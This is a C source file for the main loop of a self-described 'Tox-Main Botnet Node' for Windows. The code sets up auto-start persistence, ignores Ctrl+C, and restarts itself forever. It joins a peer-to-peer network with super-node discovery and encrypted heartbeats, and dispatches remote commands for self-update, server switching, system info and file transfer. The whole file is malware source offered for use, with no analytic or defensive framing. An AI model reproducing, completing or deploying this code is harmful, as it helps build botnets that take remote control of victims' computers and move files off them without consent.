#include "p2p_bot.h"
#include <stdio.h>
#include "startw.h"
#include "p2p_bot.h"
#include "supernode_discover.h"
// Console handler function
BOOL WINAPI console_handler(DWORD signal) {
    if (signal == CTRL_C_EVENT) {
        printf("\n[Main Program] Received Ctrl+C signal, but program will continue running (designed to never exit)\n");
        printf("[Main Program] Use Task Manager to force exit if needed\n");
        return TRUE;  // Don't exit, just log
    }
    return FALSE;
}

// Check system resources
int check_system_resources() {
    MEMORYSTATUSEX memory_status;
    memory_status.dwLength = sizeof(memory_status);
    if (GlobalMemoryStatusEx(&memory_status)) {
        DWORDLONG total_memory_gb = memory_status.ullTotalPhys / (1024 * 1024 * 1024);
        printf("[System] Detected system memory: %llu GB\n", total_memory_gb);
        return (memory_status.ullTotalPhys > 2ULL * 1024 * 1024 * 1024) ? 1 : 0;
    }
    return 0;
}

// Modified command mapping table
typedef struct {
    char command_name[32];
    COMMAND_FUNC handler;
} COMMAND_ENTRY;

static COMMAND_ENTRY g_command_handlers[] = {
    {"update_servers", handle_update_servers},
    {"switch_server", handle_switch_server},
    {"self_update", handle_self_update},
    {"get_info", handle_get_info},
    {"transfer_file", file_transfer_handle_command},
    {"", NULL}
};

// 增强的安全初始化函数
int safe_initialize() {
    printf("[Main Program] Starting enhanced safe initialization...\n");

    // 系统资源检查
    NODE_TYPE initial_type = check_system_resources() ? NODE_TYPE_SUPER : NODE_TYPE_SLAVE;
    unsigned short port = DEFAULT_PORT;

    printf("[Main Program] Node type: %s\n", initial_type == NODE_TYPE_SUPER ? "Super Node" : "Normal Node");
    printf("[Main Program] Listening port: %d\n", port);

    // 设置运行标志
    g_p2p_core.running = 1;

    // 初始化P2P网络
    printf("[Main Program] Initializing P2P network...\n");
    if (!p2p_initialize(&g_p2p_core, initial_type, port)) {
        printf("[Main Program] P2P network initialization failed! Will retry in 5 seconds...\n");
        g_p2p_core.running = 0;
        return 0;
    }

    // 初始化命令处理器（包含洪泛控制）
    printf("[Main Program] Initializing command handler with flood control...\n");
    if (!command_handler_init(&g_command_handler, &g_p2p_core)) {
        printf("[Main Program] Command handler initialization failed!\n");
        p2p_cleanup(&g_p2p_core);
        g_p2p_core.running = 0;
        return 0;
    }

    // 启动网络服务
    printf("[Main Program] Starting network service...\n");
    if (!p2p_start_network(&g_p2p_core)) {
        printf("[Main Program] Network service startup failed!\n");
        command_handler_cleanup(&g_command_handler);
        p2p_cleanup(&g_p2p_core);
        g_p2p_core.running = 0;
        return 0;
    }

    // 启动命令处理器
    printf("[Main Program] Starting command handler...\n");
    if (!command_handler_start(&g_command_handler)) {
        printf("[Main Program] Command handler startup failed!\n");
        p2p_stop_network(&g_p2p_core);
        command_handler_cleanup(&g_command_handler);
        p2p_cleanup(&g_p2p_core);
        g_p2p_core.running = 0;
        return 0;
    }

    // 启动网络状态监控
    printf("[Main Program] Starting network status monitoring...\n");
    if (!network_status_start(&g_p2p_core)) {
        printf("[Main Program] Network status monitoring startup failed!\n");
        // 非关键错误，继续启动
    }

    // 启动文件传输模块（已修复内存泄漏）
    printf("[Main Program] Starting enhanced file transfer module...\n");
    if (!file_transfer_start(&g_p2p_core)) {
        printf("[Main Program] File transfer module startup failed!\n");
        // 非关键错误，继续启动
    }

    // 初始化超级节点发现（包含分区处理）
    printf("[Main Program] Initializing enhanced super node discovery...\n");
    if (!supernode_discovery_init(&g_p2p_core)) {
        printf("[Main Program] Super node discovery initialization failed!\n");
        // 非关键错误，继续启动
    }

    // 启动超级节点发现线程 - 修复的函数名
    printf("[Main Program] Starting super node discovery thread...\n");
    if (!supernode_discovery_start(&g_p2p_core)) {  // 修复函数名
        printf("[Main Program] Super node discovery thread startup failed!\n");
        // 非关键错误，继续启动
    }

    printf("[Main Program] Enhanced node startup completed! Program will run forever...\n");
    printf("[Main Program] Restart count: %d\n", g_restart_count);
    printf("[Main Program] Features enabled: Command Flooding, Partition Healing, Memory Safety\n");
    printf("[Main Program] Ctrl+C will not exit the program (use Task Manager to force exit)\n\n");

    return 1;
}

// 增强的安全清理函数
void safe_cleanup() {
    printf("[Main Program] Performing enhanced safe cleanup...\n");

    // 停止文件传输模块
    file_transfer_stop();

    // 停止超级节点发现
    supernode_discovery_cleanup();

    // 现有清理逻辑
    command_handler_stop(&g_command_handler);
    p2p_stop_network(&g_p2p_core);
    command_handler_cleanup(&g_command_handler);
    p2p_cleanup(&g_p2p_core);

    printf("[Main Program] Enhanced safe cleanup completed\n");
}

// 增强的健康检查函数
int health_check() {
    int overall_health = 1;

    // 检查网络线程状态
    if (g_p2p_core.running == 0) {
        printf("[Health Check] ERROR: Network thread is not running\n");
        overall_health = 0;
    }
    else {
        printf("[Health Check] Network thread: OK\n");
    }

    // 检查命令处理器状态
    if (g_command_handler.running == 0) {
        printf("[Health Check] ERROR: Command handler is not running\n");
        overall_health = 0;
    }
    else {
        printf("[Health Check] Command handler: OK\n");
    }

    // 检查socket状态
    if (g_p2p_core.listen_socket == INVALID_SOCKET) {
        printf("[Health Check] ERROR: Listen socket is invalid\n");
        overall_health = 0;
    }
    else {
        fd_set write_fds;
        struct timeval timeout;
        timeout.tv_sec = 0;
        timeout.tv_usec = 100000;

        FD_ZERO(&write_fds);
        FD_SET(g_p2p_core.listen_socket, &write_fds);

        int result = select(0, NULL, &write_fds, NULL, &timeout);
        if (result > 0 && FD_ISSET(g_p2p_core.listen_socket, &write_fds)) {
            printf("[Health Check] Socket: OK\n");
        }
        else {
            printf("[Health Check] WARNING: Socket may be in error state\n");
        }
    }

    // 检查内存状态
    MEMORYSTATUSEX memory_status;
    memory_status.dwLength = sizeof(memory_status);
    if (GlobalMemoryStatusEx(&memory_status)) {
        if (memory_status.ullAvailPhys < 50 * 1024 * 1024) {
            printf("[Health Check] WARNING: Low available memory: %llu MB\n",
                memory_status.ullAvailPhys / (1024 * 1024));
        }
        else {
            printf("[Health Check] Memory: OK (%llu MB available)\n",
                memory_status.ullAvailPhys / (1024 * 1024));
        }
    }

    // 检查节点数量
    EnterCriticalSection(&g_nodes_cs);
    printf("[Health Check] Known nodes: %u\n", g_node_count);
    if (g_node_count == 0) {
        printf("[Health Check] WARNING: No known nodes in network\n");
    }
    else if (g_node_count >= MAX_NODES * 0.9) {
        printf("[Health Check] WARNING: Node list nearly full: %u/%d\n", g_node_count, MAX_NODES);
    }
    LeaveCriticalSection(&g_nodes_cs);

    // 检查网络连接状态
    NETWORK_TYPE net_type;
    char public_ip[16] = { 0 };
    if (network_detect_connection_type(&net_type, public_ip)) {
        if (net_type == NET_TYPE_NONE) {
            printf("[Health Check] ERROR: No network connection\n");
            overall_health = 0;
        }
        else if (net_type == NET_TYPE_LAN_ONLY) {
            printf("[Health Check] WARNING: LAN only, no internet access\n");
        }
        else {
            printf("[Health Check] Network connectivity: OK (%s)\n",
                net_type == NET_TYPE_WAN_ONLY ? "WAN Only" : "Both LAN/WAN");
        }
    }
    else {
        printf("[Health Check] ERROR: Network detection failed\n");
        overall_health = 0;
    }

    // 检查加密模块
    CRYPTO_CONTEXT test_ctx;
    if (crypto_init(&test_ctx)) {
        printf("[Health Check] Crypto module: OK\n");
        crypto_cleanup(&test_ctx);
    }
    else {
        printf("[Health Check] ERROR: Crypto module initialization failed\n");
        overall_health = 0;
    }

    // 新增：检查洪泛控制状态
    printf("[Health Check] Flood control: ENABLED\n");
    printf("[Health Check] Partition healing: ENABLED\n");
    printf("[Health Check] Memory safety: ENHANCED\n");

    // 检查重启计数
    if (g_restart_count > MAX_RESTART_ATTEMPTS * 0.8) {
        printf("[Health Check] WARNING: High restart count: %d/%d\n",
            g_restart_count, MAX_RESTART_ATTEMPTS);
    }

    if (overall_health) {
        printf("[Health Check] Overall health: GOOD (Enhanced)\n");
    }
    else {
        printf("[Health Check] Overall health: POOR - may need restart\n");
    }

    return overall_health;
}

void debug_network_info() {
    printf("\n=== Enhanced Network Debug Information ===\n");

    char local_ip[16] = { 0 };
    if (get_local_ip(local_ip)) {
        printf("Local IP: %s\n", local_ip);
    }

    NETWORK_TYPE net_type;
    char public_ip[16] = { 0 };
    if (network_detect_connection_type(&net_type, public_ip)) {
        printf("Network Type: %d\n", net_type);
        printf("Public IP: %s\n", public_ip);
    }

    printf("Enhanced Features: Command Flooding, Partition Healing\n");
    printf("==================================================\n\n");
}

// 增强的主循环
void main_loop() {
    unsigned int loop_count = 0;
    unsigned int last_health_check = 0;
    unsigned int last_network_broadcast = 0;
    unsigned int last_status_report = 0;
    unsigned int last_supernode_discovery = 0;
    unsigned int last_aggressive_attempt = 0;
    unsigned int last_partition_check = 0;

    printf("[Main Loop] Starting enhanced main loop\n");

    // 启动后立即触发超级节点发现
    printf("[SuperNode] Forcing initial aggressive discovery...\n");
    g_supernode_discovery.StartDiscovery();
    last_supernode_discovery = loop_count;
    last_aggressive_attempt = loop_count;

    while (g_running) {
        Sleep(1000);
        loop_count++;

        // 每5分钟广播网络状态
        if (loop_count - last_network_broadcast >= 300) {
            last_network_broadcast = loop_count;
            network_broadcast_status(&g_p2p_core);
        }

        // 每30秒健康检查
        if (loop_count - last_health_check >= 30) {
            last_health_check = loop_count;
            if (!health_check()) {
                printf("[Main Program] Health check failed, preparing to restart...\n");
                break;
            }
        }

        // 每10分钟状态报告
        if (loop_count - last_status_report >= 600) {
            last_status_report = loop_count;
            printf("[Status] Enhanced program continues running... (%u minutes)\n", loop_count / 60);

            NETWORK_TYPE net_type;
            char public_ip[16] = { 0 };
            if (network_detect_connection_type(&net_type, public_ip)) {
                const char* net_type_str = "Unknown";
                switch (net_type) {
                case NET_TYPE_LAN_ONLY: net_type_str = "LAN Only"; break;
                case NET_TYPE_WAN_ONLY: net_type_str = "WAN Only"; break;
                case NET_TYPE_BOTH: net_type_str = "Both LAN/WAN"; break;
                case NET_TYPE_NONE: net_type_str = "No Network"; break;
                }
                printf("[Status] Network status: %s, Public IP: %s\n", net_type_str, public_ip);
            }

            EnterCriticalSection(&g_nodes_cs);
            printf("[Status] Known nodes: %u\n", g_node_count);
            LeaveCriticalSection(&g_nodes_cs);
        }

        // 每5分钟分区检查 - 修复的函数调用
        if (loop_count - last_partition_check >= 300) {
            last_partition_check = loop_count;
            printf("[Partition] Periodic network partition check...\n");
            // 修复：使用正确的函数名
            g_supernode_discovery.StartDiscovery(); // 使用现有的发现函数
        }

        // 每5分钟同步超级节点列表
        if (loop_count - last_supernode_discovery >= 300 &&
            g_p2p_core.current_type == NODE_TYPE_SUPER) {
            last_supernode_discovery = loop_count;
            printf("[SuperNode] Periodic super node list synchronization\n");
            g_supernode_discovery.StartDiscovery();
        }

        // 每15分钟激进发现尝试
        if (loop_count - last_aggressive_attempt >= 900) {
            last_aggressive_attempt = loop_count;
            printf("[SuperNode] Periodic aggressive discovery attempt\n");
            g_supernode_discovery.StartDiscovery();
        }

        // 节点升级检查
        if (loop_count % DISCOVERY_INTERVAL == 0) {
            if (p2p_can_become_super_node(&g_p2p_core)) {
                if (p2p_promote_to_super_node(&g_p2p_core)) {
                    printf("[Upgrade] Node has been upgraded to super node\n");
                    g_supernode_discovery.StartDiscovery();
                    last_supernode_discovery = loop_count;
                }
            }
        }

        // 心跳
        if (loop_count % HEARTBEAT_INTERVAL == 0) {
            NETWORK_MESSAGE heartbeat_msg = { 0 };
            generate_message_id(heartbeat_msg.message_id);
            strcpy_s(heartbeat_msg.sender_id, sizeof(heartbeat_msg.sender_id), g_p2p_core.node_id);
            heartbeat_msg.message_type = MSG_TYPE_HEARTBEAT;
            heartbeat_msg.timestamp = get_timestamp();
            heartbeat_msg.encrypted = 1;

            if (p2p_broadcast_message(&g_p2p_core, &heartbeat_msg)) {
                printf("[Heartbeat] Heartbeat message sent (uptime: %u seconds)\n", loop_count);
            }
        }

        // 定期清理过期节点和会话
        if (loop_count % 1800 == 0) {
            printf("[Maintenance] Cleaning up expired nodes and sessions\n");
            file_transfer_cleanup_sessions();

            EnterCriticalSection(&g_nodes_cs);
            unsigned long long current_time = get_timestamp();
            unsigned int expired_count = 0;

            for (unsigned int i = 0; i < g_node_count; i++) {
                if (current_time - g_known_nodes[i].last_seen > 3600) {
                    printf("[Maintenance] Removing expired node: %s\n", g_known_nodes[i].node_id);
                    for (unsigned int j = i; j < g_node_count - 1; j++) {
                        g_known_nodes[j] = g_known_nodes[j + 1];
                    }
                    g_node_count--;
                    i--;
                    expired_count++;
                }
            }

            if (expired_count > 0) {
                printf("[Maintenance] Removed %u expired nodes\n", expired_count);
            }
            LeaveCriticalSection(&g_nodes_cs);
        }

        // 内存和资源监控
        if (loop_count % 1200 == 0) {
            MEMORYSTATUSEX memory_status;
            memory_status.dwLength = sizeof(memory_status);
            if (GlobalMemoryStatusEx(&memory_status)) {
                printf("[Memory] Usage: %lu%%, Available: %llu MB\n",
                    memory_status.dwMemoryLoad,
                    memory_status.ullAvailPhys / (1024 * 1024));

                if (memory_status.ullAvailPhys < 100 * 1024 * 1024) {
                    printf("[Memory] Low memory detected, forcing cleanup\n");
                    file_transfer_cleanup_sessions();
                }
            }
        }
    }

    printf("[Main Loop] Enhanced main loop exited\n");
}

// Main function
int main() {
    printf("=== Enhanced Tox-Main Botnet Node Starting ===\n");
    printf("[Main Program] Enhanced version with command flooding and partition healing\n");
    debug_network_info();

    // Start auto-start function
    startself();

    // Set console handler (ignore Ctrl+C)
    SetConsoleCtrlHandler(console_handler, TRUE);

    // Main running loop (never exits)
    while (1) {
        if (g_restart_count >= MAX_RESTART_ATTEMPTS) {
            printf("[Main Program] Reached maximum restart attempts (%d), program will sleep for 1 hour then continue\n", MAX_RESTART_ATTEMPTS);
            Sleep(3600000);
            g_restart_count = 0;
        }

        if (safe_initialize()) {
            main_loop();
        }

        safe_cleanup();
        g_restart_count++;
        printf("[Main Program] Preparing to restart... Attempt count: %d/%d\n", g_restart_count, MAX_RESTART_ATTEMPTS);

        printf("[Main Program] Auto-restart in 5 seconds...\n");
        for (int i = 5; i > 0; i--) {
            printf("[Main Program] Restart countdown: %d seconds\n", i);
            Sleep(1000);
        }
        printf("[Main Program] Restarting enhanced node...\n\n");
    }

    return 0;
}